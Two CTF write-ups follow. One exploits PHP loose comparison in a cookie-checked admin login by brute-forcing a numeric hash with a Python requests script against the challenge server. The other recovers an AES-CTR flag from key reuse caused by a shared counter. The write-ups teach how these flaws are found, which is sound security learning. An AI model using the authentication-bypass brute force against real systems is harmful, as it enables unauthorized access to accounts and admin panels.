# CONfidenceCTF write-ups

## Web - My Admin Panel

**Author:** Kaushik S Kalmady, Rakshith G

We can download a `login.php.bak` file which contains the php code that runs at the `/login.php` endpoint.
```php
<?php

include '../func.php';
include '../config.php';

if (!$_COOKIE['otadmin']) {
    exit("Not authenticated.\n");
}

if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
    exit();
}

$session_data = json_decode($_COOKIE['otadmin'], true);

if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }

if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
    echo("I CAN EVEN GIVE YOU A HINT XD \n");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }

    exit("\n");
}

display_admin();
```

Here are the things we can ascertain:
  - We need to send a cookie named `otadmin`
  - The cookie needs to be a valid json with a key field "hash"
  - The value field needs to match the regex `'/^{"hash": [0-9A-Z\"]+}$/'`, a hex with numbers and uppercase letter, can be enclosed in quotes
  - The value field has to match the `md5($cfg_pass)`

We are given some additional info though. If the payload we send doesn't match the md5, we are given a hint, which is the XOR of each character in the intended md5 with `0xC0`. This will actually be `0` where there are numbers, and `64` where character is a uppercase letter.

Let's send a sample payload
```python
>>> url = "https://gameserver.zajebistyc.tf/admin/login.php?"
>>> cookie = {"otadmin" : '{"hash" : "aaaaaaaaaaaaaaaa"}'}
>>> request.get(url, cookies=cookie).text
'I CAN EVEN GIVE YOU A HINT XD \n0006464640640064000646464640006400640640646400\n'
```

We can see that the xored string contains three 0s in the beginning and is followed by some uppercase letters.

Let's go back to the code now.
`$session_data['hash'] != strtoupper(MD5($cfg_pass)`

The comparison used is `!=`. If you read up about comparisons in php you'll find that `!=` is a type of weak comparison, where the LHS and RHS need not be of the same type. If  string and number are compared, then the string is first converted to number and then the comparison is done.

For e.g,
```php
0 != "1"  # True
0 != "0"  # False
```

Also during this string conversion to number, the characters starting from the first non numeric character are ignored. So `"123abc12"` becomes `123`. There's our exploit!

Remember that the md5 string contains three letters in the beginning followed by some characters, so if we pass the payload as a number, php will convert the md5 string to the number equivalent to first three chars and compare it with our payload. This means that we can now bruteforce this! 

This will be possible because as per the regex, we need not enclose the value field in the json with quotes, meaning we can send a number.

Here is the code to get the flag:
```python
def breakphp():
    url = "https://gameserver.zajebistyc.tf/admin/login.php?"
    default = 'I CAN EVEN GIVE YOU A HINT XD \n0006464640640064000646464640006400640640646400\n'

    # First three chars are numbers, then text
    # If our json payload is a number that matches the first three digits of md5
    # The != condition will be bypassed

    nums = "0123456789"
    
    # The regex is '/^{"hash": [0-9A-Z\"]+}$/'
    # Therefore we can send a number in the json payload, need not be string
    
    for i in nums[1:]: # json doesn't decode if the first digit is 0
        for j in nums:
            for k in nums:
                val = i + j + k
                cookie = {"otadmin" : '{"hash": ' + val + '}'}
                res = requests.get(url, cookies=cookie).text
                if res != default:
                    print(cookie)
                    print(res)
                    return

breakphp()
```

> Congratulations! p4{wtf_php_comparisons_how_do_they_work}

## Crypto - Count me in!

**Author:** Kaushik S Kalmady

We have the encryption code in `count.py`. AES in CTR mode is used. But additionally here the author uses multiprocessing to speed up the process. 

First, it's important to know how CTR mode works. CTR mode tries to create a key stream so that the algorithm works like a stream cipher. Usually a counter is initialized to 1 and is encrypted. This is the key for the first block. For the second block, the counter is incremented and then encrypted (here using AES ECB). In this way we generate n blocks of unique keys for n blocks of plaintext. So this technically works like a XOR cipher with keylength = plaintext.

The problem here is in this function:
```python

def worker_function(block):
    global counter
    key_stream = aes.encrypt(pad(str(counter)))
    result = xor_string(block, key_stream)
    counter += 1
    return result
```

Since one worker is assigned for one plaintext block, all workers that run in parallel will use the same counter and hence the same key. Therefore there is key reuse across the ciphertext, and since we know all the plaintext(except the flag) and ciphertext blocks, we can recover all the different keys used and then use all of them to try to decrypt the ciphertext of the flag. 

Following is the decryption script also found in `solvecountme.py`:
```python
import binascii

def chunk(input_data, size):
    return [input_data[i:i + size] for i in range(0, len(input_data), size)]


def xor(*t):
    from functools import reduce
    from operator import xor
    return [reduce(xor, x, 0) for x in zip(*t)]


def xor_string(t1, t2):
    t1 = map(ord, t1)
    t2 = map(ord, t2)
    return "".join(map(chr, xor(t1, t2)))

plaintext = """The Song of the Count

You know that I am called the Count
Because I really love to count
I could sit and count all day
Sometimes I get carried away
I count slowly, slowly, slowly getting faster
Once I've started counting it's really hard to stop
Faster, faster. It is so exciting!
I could count forever, count until I drop
1! 2! 3! 4!
1-2-3-4, 1-2-3-4,
1-2, i love couning whatever the ammount haha!
1-2-3-4, heyyayayay heyayayay that's the sound of the count
I count the spiders on the wall...
I count the cobwebs in the hall...
I count the candles on the shelf...
When I'm alone, I count myself!
I count slowly, slowly, slowly getting faster
Once I've started counting it's really hard to stop
Faster, faster. It is so exciting!
I could count forever, count until I drop
1! 2! 3! 4!
1-2-3-4, 1-2-3-4, 1,
2 I love counting whatever the
ammount! 1-2-3-4 heyayayay heayayay 1-2-3-4
That's the song of the Count!
"""

c = "9d5c66e65fae92af9c8a55d9d3bf640e8a5b76a878cbf691d3901392c9b8760ebd5c62b22c88dca9d1c55098cbbb644ae9406ba32c8293bdd29139bbc2b4605bba51238f2cb399a9d0894ad9cbb8774be9406ce66fae89a6c8ef7ad9c4b87442ad1470af78e19da6d8c55096d2b9750ea8586fe668a085c2ef8a5e9cd3be6c4bba144ae66ba488e8df84418bceb2650ea84362bf0688dcabd3905d8d87a46d414626be04a58215b84263a620de3203fa4626be08e2940da35c61b82c98201ce15438cd67eb921cf77c28a969de321bf4433ea24ca59216a25b7bb662996106e11639e75ae09015bb4c2fb76d8c254fe15e6ab45cea817391547cab698c6d4ff35039b34df7df599e412fb67fde3200b55432a441f19817b01405962c9d2e1af9556aa447f09f0df75360ad6988241db91129a85deb8559a25b7bb660de084ff1cc3a0e8041bc71d71fb29883931d9d3e8f784ca743b065c91ea386909e1a9100925f4fa742b1718c1efec4d4d609df5bcb3b17e417bd268d5fe6ced4d65b9c40d6305eeb1df03e9050e68bcad241dd15b46453b85dae7cd112b2c3c7ca50dd4ddf2c1ff350f5349c5febcadbd2509c40d6340aad03bd258d5bb2d8cdc647d814d1335efe18f8718651e7c5d6b9609c57d12010fe50e939801ee1dbcbd74cce4739c1eeceba8ef87360b629ed82a6eb9d508ee381bb88e97363bf20a1cfe7a7e07cccf3cea788bd277fb265e9cde4a9b937808aa7ee85f22679a365f5c4ede5f478c0e482ab95bd3c79f731e9c9a8b6ff7cc2e6c0e0c897047fb22ba1e5afa8b778c2ef80abcabd1a37b42af4c2fce5fa60dde582a8c7971a37b42af4c2fce5e475c1f782b7cabd207bb832edd5a4e5e4130a976ad4a2fe86ac99c18491f9f6c86adae59cc4a9f33072f70ca6daede5e40b049272c8e6b980b798c69e9fb7f7891611c7758df0fc82b481d1ca9eb8e2cd5f118f26def6f693d2abc99982bce2855f038175d9e7ebcdf8a4dcca9faab0da1045857eceebed8ab68a89e0bff9f3c60a098426ceedec8daccdce8584bce6cc0d49c065c2f7f797f898c69e9fb5b0e05f019269dd88a8c2f8df89cac5f8b09d00ad16dc760ead7c3518baed47603c5b5251cc269cae93d1f8a4888699aff58942c8529f304af0362143f2bd1e37670d538753992129ff3c6c5befb21e7331590c950ac26917be39644dfba50b2b70117fcbccba57b209ae95721a1c9d36073d934b75014109102be14fb6a044a7cf9e468748976457f6342177f5a9042630622f97d2ba5a8c04a7890d4e5fcb445b7600d7c1be71b711b6b32b4444f078557ef82e4f0559225437b455aa9a0bbaff89c834531a45115125c933d6cd6cdca8f8"

chunks = chunk(plaintext, 16) # AES CTR chunk size used is 16
c = chunk(c, 32) # 32 hex chars = 16 bytes

for i in range(len(c)): # Get raw bytes from hex
    c[i] = binascii.unhexlify(c[i])

keys = []
for i in range(57): # Get all possible keys used
    keys.append(xor_string(chunks[i], c[i]))

for k in list(set(keys)): # The flag must be encrypted with one of the keys
    for ct in c[-4:]:
        print(xor_string(k, ct))
```

In the output we can see parts of the flag, putting them together we can recover the entire flag.

> p4{at_the_end_of_the_day_you_can_only_count_on_yourself}

